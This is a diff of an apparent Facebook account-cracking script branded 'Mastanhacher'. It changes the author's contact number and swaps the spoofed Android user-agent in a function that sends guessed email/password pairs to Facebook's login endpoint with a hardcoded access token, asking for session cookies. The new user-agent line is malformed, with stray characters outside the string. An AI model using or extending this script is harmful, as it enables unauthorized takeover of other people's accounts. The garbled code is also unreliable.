@@ -28,7 +28,7 @@ $$ | \_/ $$ |\$$$$$$$ |$$$$$$$  |  \$$$$  |\$$$$$$$ |$$ |  $$ |
                               \033[1;97F Mastanhacher
 \033[1;97m--------------------------------------------------
 \033[1;91m Author     : Mastan King 
-\033[1;91m WhatsApp   :0093705264430     
+\033[1;91m WhatsApp   :0093708509223   
 \033[1;91m facebook   : https://www.facebook.com/profile.php?id=Mastan
 \033[1;91m Telegram   : Matan king
 \033[1;91m Status     : FREE
@@ -96,7 +96,7 @@ def rndm(ids,mking_pass):
 			build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
 			fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
 			fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
-			ua = 'Dalvik/2.1.0 (Linux; U; Android '+android_version+'; '+model+' Build/'+build+') [FBAN/Orca-Android;FBAV/'+fbav+';FBBV/'+fbbv+';FBRV/0;FBPN/com.facebook.orca;FBLC/en_US;FBMF/'+fbmf+';FBBD/'+fbbd+';FBDV/'+model+';FBSV/'+android_version+';FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density='+str(random.randint(1,9))+'.'+str(random.randint(1,9))+',width='+str(random.randint(500,999))+',height='+str(random.randint(999,1999))+'};FB_FW/1;]'
+			ua = '،Dalvik/2.0.0 (Linux; U; Android 11; Xiaomi Redmi Note 10 Pro Build/SPB4.210517.014) [FBAN/FB4A;FBAV/;{application_version}{application_version}FBDM/{density=3.0,width=1080,height=2340};FBLC/en_US;FBRV/'+str(random.randint(10000000, 99999999))+';FBCR/Verizon;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/Galaxy S21;FBSV/11;FBOP/1;FBCA/arm64-v8a;]'،
 			data ={"locale": "en_GB","format": "json","email": ids,"password": pas,"access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28","generate_session_cookies": 1}
 			head = {'user-agent':ua,'Host':'graph.facebook.com','Content-Type':'application/json;charset=utf-8','Content-Length':'595','Connection':'Keep-Alive','Accept-Encoding':'gzip'}
 			po = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=head).json()
